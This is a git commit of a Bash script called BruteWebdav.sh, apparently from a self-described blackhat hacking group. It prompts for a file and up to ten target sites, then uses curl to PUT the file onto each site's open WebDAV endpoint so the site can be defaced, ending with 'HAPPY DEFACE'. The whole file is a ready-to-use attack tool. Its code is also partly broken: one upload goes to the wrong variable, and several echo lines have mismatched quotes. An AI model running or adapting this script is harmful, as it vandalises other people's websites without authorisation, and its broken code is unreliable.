956e440a711c4f5bff55db70a38463b022518bac
DarknessCyberTeam <38211186+DarknessCyberTeam@users.noreply.github.com>
2018-04-30 12:30:25 +0000

    Add files via upload

---
+++ BruteWebdav.sh
@@ -0,0 +1,89 @@
+#usr/bin/bash
+clear
+echo "\033[37;1m"
+toilet -f standard -F gay "BruteWebdav"
+echo "\033[34;1m"
+echo "\033[32;1mauthor: Mr.B4J1N64N"
+echo "\033[33;1mTeam: Darkness Cyber Team"
+echo "\033[34;1mIndonesia Security Lite"
+echo "\033[32;1mJawaBarat Blackhat Army"
+echo ""
+echo ""
+echo "\033[32;1m[01].Brute Deface Webdav"
+echo "\033[33;1m[02].EXIT"
+read -p "[========>" ganteng
+echo ""
+echo ""
+sleep 1
+if [ $ganteng = 01 ] || [ $ganteng = 1 ]
+then
+echo "Masukan nama script"
+read -p "[=======>" script
+echo "\033[32;1m"
+echo "Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo "\033[32;1m" "Masukan Web Target Ke2 "
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo "\033[32;1m" "Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo "\033[32;1m" "Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke5
+echo "\033[32;1m" "Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo "\033[32;1m" "Masukan Web Target Ke6"
+read -p "[=======>" Ke6
+curl -T /storage/emulated/0/$script $Ke6
+echo "\033[32;1m" "Masukan Web Target Ke7"
+read -p "[=======>" Ke7
+curl -T /storage/emulated/0/$script $Ke7
+echo "\033[32;1m" "Masukan Web Target Ke8"
+read -p "[=======>" Ke8
+curl -T /storage/emulated/0/$script $Ke8
+echo "\033[32;1m" "Masukan Web Target Ke9"
+read -p "[=======>" Ke9
+curl -T /storage/emulated/0/$script $Ke9
+echo "\033[32;1m" "Masukan Web Target Ke10"
+read -p "[=======>" Ke10
+curl -T /storage/emulated/0/$script $Ke10
+sleep 1
+echo "[<=====================SEDANG PROSES=====================>]
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo "Silahkan Cek Web $Ke6/$script"
+echo "Silahkan Cek Web $Ke7/$script"
+echo "Silahkan Cek Web $Ke8/$script"
+echo "Silahkan Cek Web $Ke9/$script"
+echo "Silahkan Cek Web $Ke10/$script"
+echo "[=============HAPPY DEFACE=============]"
+
+fi
+if [ $ganteng = 02 ] || [ $ganteng = 2 ]
+then
+echo "\033[32;1mWe Are Family DARKNESS CYBER TEAM"
+sleep 1
+echo "\033[33;1mWe Are Anonymous"
+sleep 1
+echo " "We Are Legion"
+sleep 1
+echo " "We Do Not For Give"
+sleep 1
+echo " "We Do Not For Get"
+sleep 1
+echo " "The Indonesian Anonymous Family"
+sleep 1
+echo " "Expect Us"
+sleep 1
+echo "\033[32;1m Incarlah suatu hal mustahil:) Suatu saat Kamu akan Mendapatkannya:)"
+sleep 1
+exit
+fi
+
+
